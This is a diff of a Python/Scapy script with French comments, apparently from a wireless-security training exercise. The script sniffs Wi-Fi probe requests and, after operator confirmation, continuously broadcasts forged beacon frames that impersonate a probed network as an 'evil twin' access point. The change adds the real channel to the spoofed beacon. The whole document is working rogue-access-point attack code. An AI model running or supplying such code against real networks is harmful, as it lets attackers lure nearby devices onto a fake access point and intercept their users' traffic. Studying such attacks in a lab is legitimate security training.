@@ -21,7 +21,7 @@ parser.add_argument("-t", "--Timeout", required=False,
 
 args = parser.parse_args()
 
-####################################
+
 ################## variables ##################
 
 IFACE_NAME = args.Interface
@@ -30,12 +30,6 @@ BROADCAST = "ff:ff:ff:ff:ff:ff"
 sta_list = []
 ssid_list = []
 
-# Si jamais l'interface est down
-#os.system("ifconfig %s up" % IFACE_NAME)
-#Launch airodump-ng en background / screen permet de ne pas afficher sur la console le process passé en argument
-#p = subprocess.Popen(['screen','-d','-m','airodump-ng',IFACE_NAME])
-
-####################################
 ################## fonctions ##################
 
 def PacketHandler(pkt):
@@ -63,7 +57,7 @@ def PacketHandler(pkt):
         if pkt.haslayer(Dot11Elt):
 
             SSID = pkt.info.decode("utf-8")
-
+            channel = pkt.channel
             # On vérifie si le ssid se trouve dans le tableau des ssid recherchés 
             # par une STA
             if SSID in ssid_list:
@@ -71,11 +65,11 @@ def PacketHandler(pkt):
                 # On demande si on veut lancer un evil tween avec le SSID trouvé
                 user_input = input("Would you make an evil tween ? (y/n) \n")
                 if user_input == "y":
-                    evil_tween(SSID)
+                    evil_tween(SSID, channel)
                 else:
                     exit(1)
 
-def evil_tween(ssid):
+def evil_tween(ssid, channel):
     faker = Faker()
 
     #Préparation de la frame à envoyer#
@@ -85,15 +79,13 @@ def evil_tween(ssid):
     beacon = Dot11Beacon(cap='ESS+privacy')
     #SSID de l'AP à spoof
     essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
-
-    #build de la frame (on a décider de ne pas utiliser de Robust Secure Network (RSN)
-    # car ce n'est pas nécessaire pour un entrainement comme ceci)
-    frame = RadioTap()/dot11/beacon/essid
+    chan = Dot11Elt(ID='DSset', info=chr(channel))
+    
+    frame = RadioTap()/dot11/beacon/essid/chan
 
     #envoi de la frame en continu toutes les 0.1 secondes depuis l'interface IFACE_NAME
     sendp(frame, iface=IFACE_NAME, inter=0.100, loop=1) 
     
-####################################
 ################## main ##################
 
 sniff(iface=IFACE_NAME, prn=PacketHandler, timeout=timeout)
